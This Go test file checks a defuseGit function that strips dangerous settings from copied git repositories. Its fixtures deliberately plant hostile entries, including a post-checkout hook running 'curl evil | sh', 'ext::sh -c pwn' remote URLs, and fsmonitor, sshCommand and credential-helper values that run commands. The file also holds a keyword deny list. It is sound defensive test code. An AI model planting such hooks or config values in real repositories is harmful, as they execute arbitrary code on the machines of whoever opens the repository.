package sessions

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func write(t *testing.T, path, body string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(body), 0o755); err != nil {
		t.Fatal(err)
	}
}

// repo makes the bones git recognises as a repository directory.
func repo(t *testing.T, g string) {
	t.Helper()
	write(t, filepath.Join(g, "HEAD"), "ref: refs/heads/main\n")
	write(t, filepath.Join(g, "objects", "info", "packs"), "")
	write(t, filepath.Join(g, "refs", "heads", "main"), "0000000000000000000000000000000000000000\n")
}

func TestDefuseGitKeepsHistoryAndDropsWhatRuns(t *testing.T) {
	dest := t.TempDir()
	g := filepath.Join(dest, ".git")
	repo(t, g)
	write(t, filepath.Join(g, "hooks", "post-checkout"), "#!/bin/sh\ncurl evil | sh\n")
	write(t, filepath.Join(g, "config"), `[core]
	repositoryformatversion = 0
	fsmonitor = /tmp/pwn
	hooksPath = /tmp/hooks
	sshCommand = sh -c pwn
	bare = false
[include]
	path = /tmp/more
[includeIf "gitdir:/"]
	path = /tmp/more
[filter "lfs"]
	clean = sh -c pwn
[diff "x"]
	textconv = pwn
[remote "origin"]
	url = https://github.com/tiny-systems/seedling
	fetch = +refs/heads/*:refs/remotes/origin/*
	uploadpack = sh -c pwn
[remote "evil"]
	url = ext::sh -c pwn
[remote "quoted"]
	url = "ext::sh -c pwn"
[remote "escaped"]
	url = ex\
t::sh
[branch "main"]
	remote = origin
	merge = refs/heads/main
[credential]
	helper = !pwn
[alias]
	st = !pwn
`)
	repo(t, filepath.Join(g, "modules", "lib"))
	write(t, filepath.Join(g, "modules", "lib", "hooks", "pre-commit"), "pwn")
	write(t, filepath.Join(g, "modules", "lib", "config"), "[core]\n\tfsmonitor = pwn\n")
	write(t, filepath.Join(g, "config.worktree"), "[core]\n\tfsmonitor = pwn\n")
	write(t, filepath.Join(g, "commondir"), "/Users/someone/other/.git\n")

	if err := defuseGit(dest); err != nil {
		t.Fatal(err)
	}
	cfg, _ := os.ReadFile(filepath.Join(g, "config"))
	got := string(cfg)
	for _, bad := range []string{"fsmonitor", "hookspath", "sshcommand", "include", "filter", "textconv", "uploadpack", "ext::", "credential", "alias", "pwn"} {
		if strings.Contains(strings.ToLower(got), bad) {
			t.Errorf("config still has %q:\n%s", bad, got)
		}
	}
	for _, good := range []string{"repositoryformatversion = 0", "url = https://github.com/tiny-systems/seedling", "merge = refs/heads/main", "[remote \"origin\"]"} {
		if !strings.Contains(got, good) {
			t.Errorf("config lost %q:\n%s", good, got)
		}
	}
	for _, gone := range []string{"hooks/post-checkout", "modules/lib/hooks/pre-commit", "config.worktree", "commondir"} {
		if _, err := os.Stat(filepath.Join(g, gone)); !os.IsNotExist(err) {
			t.Errorf("%s survived", gone)
		}
	}
	sub, _ := os.ReadFile(filepath.Join(g, "modules", "lib", "config"))
	if strings.Contains(string(sub), "fsmonitor") {
		t.Errorf("submodule config kept fsmonitor: %s", sub)
	}
	if _, err := os.Stat(filepath.Join(g, "HEAD")); err != nil {
		t.Error("HEAD was removed")
	}
}

func TestDefuseGitRemovesAGitFile(t *testing.T) {
	dest := t.TempDir()
	write(t, filepath.Join(dest, ".git"), "gitdir: /Users/someone/project/.git\n")
	if err := defuseGit(dest); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Lstat(filepath.Join(dest, ".git")); !os.IsNotExist(err) {
		t.Error(".git file survived")
	}
}

func TestDefuseGitCatchesLinksNestedAndBareRepos(t *testing.T) {
	dest := t.TempDir()
	g := filepath.Join(dest, ".git")
	repo(t, g)
	write(t, filepath.Join(g, "config"), "[core]\n\tbare = false\n")
	// hooks as a link to scripts in the working tree
	write(t, filepath.Join(dest, "scripts", "post-checkout"), "pwn")
	if err := os.Symlink("../scripts", filepath.Join(g, "hooks")); err != nil {
		t.Fatal(err)
	}
	// a submodule whose name is "objects"
	repo(t, filepath.Join(g, "modules", "objects"))
	write(t, filepath.Join(g, "modules", "objects", "hooks", "pre-commit"), "pwn")
	write(t, filepath.Join(g, "modules", "objects", "config"), "[core]\n\tfsmonitor = pwn\n")
	// a repository nested in the working tree, and a bare one
	repo(t, filepath.Join(dest, "vendor", "lib", ".git"))
	write(t, filepath.Join(dest, "vendor", "lib", ".git", "hooks", "pre-commit"), "pwn")
	write(t, filepath.Join(dest, "vendor", "lib", ".git", "config"), "[core]\n\tfsmonitor = pwn\n")
	repo(t, filepath.Join(dest, "fixtures", "bare.git"))
	write(t, filepath.Join(dest, "fixtures", "bare.git", "config"), "[core]\n\tbare = true\n\tfsmonitor = pwn\n")
	// a gitfile in a subfolder
	write(t, filepath.Join(dest, "sub", ".git"), "gitdir: /elsewhere\n")

	if err := defuseGit(dest); err != nil {
		t.Fatal(err)
	}
	if fi, err := os.Lstat(filepath.Join(g, "hooks")); err != nil || !fi.IsDir() {
		t.Errorf("hooks should be a real empty directory: %v %v", fi, err)
	}
	if _, err := os.Stat(filepath.Join(dest, "scripts", "post-checkout")); err != nil {
		t.Error("the working tree file a link pointed at should be left alone")
	}
	for _, gone := range []string{".git/modules/objects/hooks/pre-commit", "vendor/lib/.git/hooks/pre-commit", "sub/.git"} {
		if _, err := os.Lstat(filepath.Join(dest, gone)); !os.IsNotExist(err) {
			t.Errorf("%s survived", gone)
		}
	}
	for _, cfg := range []string{".git/modules/objects/config", "vendor/lib/.git/config", "fixtures/bare.git/config"} {
		b, _ := os.ReadFile(filepath.Join(dest, cfg))
		if strings.Contains(string(b), "fsmonitor") {
			t.Errorf("%s kept fsmonitor: %s", cfg, b)
		}
	}
}
